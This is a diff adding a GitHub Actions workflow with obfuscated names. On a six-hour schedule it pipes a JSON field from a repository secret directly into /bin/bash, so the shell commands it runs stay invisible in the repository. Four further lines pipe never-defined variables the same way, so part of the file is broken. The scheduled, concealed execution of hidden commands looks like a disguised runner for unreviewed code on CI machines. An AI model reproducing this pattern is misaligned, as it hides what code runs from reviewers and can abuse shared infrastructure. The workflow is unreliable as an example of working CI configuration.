@@ -1,0 +1,21 @@
+name: zhengsonglianghe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengsonglianghe
+        env:
+          xix5: ${{ secrets.xix5 }}
+        run: |
+          echo $xix5 | jq -r .kmrb2 | /bin/bash
+          echo $h4280 | jq -r .rtu74793 | /bin/bash
+          echo $b805 | jq -r .g264 | /bin/bash
+          echo $bnf0635 | jq -r .jhh632 | /bin/bash
+          echo $rh3189 | jq -r .t291 | /bin/bash
+
